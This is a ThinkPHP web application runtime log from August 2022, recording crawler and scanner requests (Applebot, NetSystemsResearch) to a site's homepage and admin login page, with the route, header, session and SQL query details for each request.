[ sql ] [ DB ] CONNECT:[ UseTime:0.000206s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000599s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000199s ]
---------------------------------------------------------------
[ 2022-08-10T16:46:14+08:00 ] 17.121.113.57 GET ywscs.com/
[运行时间：0.017489s] [吞吐率：57.18req/s] [内存消耗：2,068.33kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)',
  'host' => 'ywscs.com',
  'accept-encoding' => 'gzip,identity',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T16:46:15+08:00 ] 17.121.113.57 GET ywscs.com/admin/login/index.html
[运行时间：0.024481s] [吞吐率：40.85req/s] [内存消耗：2,858.11kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)',
  'host' => 'ywscs.com',
  'accept-encoding' => 'gzip,identity',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000799s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000196s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000610s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000197s ]
---------------------------------------------------------------
[ 2022-08-10T16:49:38+08:00 ] 113.31.117.95 GET 114.116.100.177:443/
[运行时间：0.016611s] [吞吐率：60.20req/s] [内存消耗：2,066.52kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '114.116.100.177:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T18:34:36+08:00 ] 185.173.35.57 GET 114.116.100.177:443/
[运行时间：0.016577s] [吞吐率：60.32req/s] [内存消耗：2,067.21kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com',
  'host' => '114.116.100.177:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T18:34:37+08:00 ] 185.173.35.57 GET 114.116.100.177:443/admin/login/index.html
[运行时间：0.023889s] [吞吐率：41.86req/s] [内存消耗：2,856.99kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com',
  'host' => '114.116.100.177:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000795s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000426s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000589s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000217s ]
